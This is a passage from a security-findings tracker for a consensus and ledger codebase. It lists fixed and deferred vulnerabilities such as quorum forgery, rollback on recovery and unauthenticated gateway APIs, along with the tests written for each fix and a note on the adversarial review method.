   proxied publicly. *Needs redeploy (bot is live on the edge).*
4. **LEASE-1a + LEASE-3 (✅ FIXED)** — create gated on a verified on-chain funded
   lease (`FundingSource`/`AttestedFunding::from_verified_source`, self-asserted
   funding refused); settlement deduped by a durable write-ahead `(lease,period)`
   ledger (`DurableSettleLedger`), at-most-once across restart.
5. **F1 (✅ FIXED)** — `voter_id` deduped in the Ed25519 QC verifier
   (`is_valid_with_keys`/`verify_with_keys` reject duplicate voters; only distinct
   voters count toward threshold). Single-key quorum forgery defeated.
6. **LC-1 / LC-2 / LC-3 (HIGH)** — ✅ **FIXED**: every light/web acceptance is anchored
   to the signed committee. LC-1: web-of-cells signs real Ed25519 quorum sigs +
   `AttestedResource::verify_anchored(committee)` gates on `is_valid` (and `threshold:0`
   is refused on the keyless path). LC-2: `verify_finalized_history` takes the trusted
   committee and counts only its members (threshold over the committee size, not the
   cert-supplied count); a fork by foreign keys / an unanchored client is refused. LC-3:
   `verify_finalized_devnet_history` wires the committee-anchored finality leg into the
   wasm client.
7. **NODE-1 / NODE-2 (HIGH, live)** — ✅ **FIXED**: recovery is anchored to the
   committee-signed attested root (`verify_signatures(committee)`; a forged/unsigned
   finalization refuses the boot) plus a monotonic anti-rollback floor (signed height +
   persisted high-water mark; a head below the witnessed floor refuses the boot).
8. **GW-1 / GW-2 (HIGH, live)** — app-layer auth on the gateway machines API;
   close the `*.dregg.works`/`www` fall-through; set `OPS_ADMIN_TOKEN`.
9. **MESH-2 (HIGH, live)** — scope node `:8420/:9420` off `0.0.0.0`; auth the reads.
10. **BR-2 / BR-3 / BR-1 (CRITICAL, latent)** — before any relayer/webhook deploy:
    bind inclusion to a bridge-owned escrow, gate mints on the authorized-voter
    tally, pin the anchor, make conservation non-vacuous from an independent locked
    source, and demote the RAM mint APIs.
11. **F2 (HIGH)** — back admission bonds with a verified locked-cell commitment.
12. **MED/LOW** — WALLET-3 (per-origin subscribe), MESH-1 (ephemeral preauth keys),
    LC-4/LC-5, F3/F4/F5, WALLET-4, LEASE-4b, GW-1b, MESH-3.

---

## Trust-anchoring stabilization lane (2026-06-29) — what landed + what deferred

This pass closed the HIGH-tier trust-anchoring residuals and the two parity gates that
keep them real. The unifying rule applied throughout: **a gate must check the
SIGNED/ATTESTED artifact, never a count / a self-reported field / a self-stored root.**

**Fixed (code + refusal test + no regression):**
- **LC-1 / LC-2 / LC-3** — light/web acceptance anchored to the signed committee (see the
  per-finding FIXED notes above). Tests: `committee_anchored_verify_accepts_genuine_and_refuses_forgeries`
  (web), `finalized_light_client_rejects_fork_by_foreign_committee` +
  `committee_anchored_quorum_counts_only_trusted_keys` + `finalized_light_client_refuses_when_unanchored`
  (lightclient).
- **NODE-1 / NODE-2** — recovery anchored to the committee-signed attested root + a
  monotonic anti-rollback floor. Tests: `node1_forged_attested_root_refuses_to_start`,
  `node2_rollback_below_high_water_refuses_to_start`,
  `node2_high_water_allows_equal_or_higher_head_and_advances`.
- **Parity #6/#7 — fail-open-when-Lean-unlinked startup hard-check** (`node/src/main.rs`):
  a node in FULL (multi-party BFT) federation mode — a verified-consensus role — now
  REFUSES to start when `dregg_lean_ffi::tau_order_available()` is false (the verified
  `dregg_tau_order` archive is not linked), rather than silently degrading to the
  un-verified Rust ordering per poll. A solo node and a node that never federates are
  unaffected, so the intentional mixed rust/lean network keeps working. Escape hatch
  `DREGG_ALLOW_UNVERIFIED_CONSENSUS=1` is opt-in (fail-closed by default for the role).
- **Parity #26 — agent-lifecycle admission gate** (`turn/src/executor/execute.rs`): the
  admit-without-apply entry `validate_without_apply` now also rejects a terminal
  (Destroyed/Migrated) agent with `AdmissionRefused{DeadAgent}`, matching `execute` and
  the Lean `cellLifecycleCanAuthor` — closing a validate↔execute divergence. Test:
  `validate_without_apply_rejects_terminal_agent`.

**Deferred (out of this lane's safe scope):**
- **MESH-2** — the node bind-scoping (`0.0.0.0`→loopback/overlay) is a docker-compose /
  deploy-config change (REVIEWED-GO); the node read-API bearer-auth is deploy-coordinated
  (the edge→node read path would need the bearer when one is configured). The default
  bind is already `127.0.0.1` and a `0.0.0.0` bind already warns at startup. Left for a
  reviewed deploy pass to avoid breaking the live edge.
- **GW-1 / GW-2** — the gateway/webapp machines-API auth lives in the DreggNet repo
  (`gateway/`, `webapp/`), outside this breadstuffs lane.

---

*Method note:* eight surfaces were attacked in parallel by adversarial reviewers
reading both repos; the lead re-verified the CAP-1 (catch-all + Access/Unchecked +
SetProgram self-target), F1 (no voter dedup), and supporting cites against source
at HEAD before stamping. No code was patched in this pass — each finding is a
separate fix lane. Latent vs live is tagged per finding; "HOLDS" findings carry
their blocking evidence so they are not re-litigated.
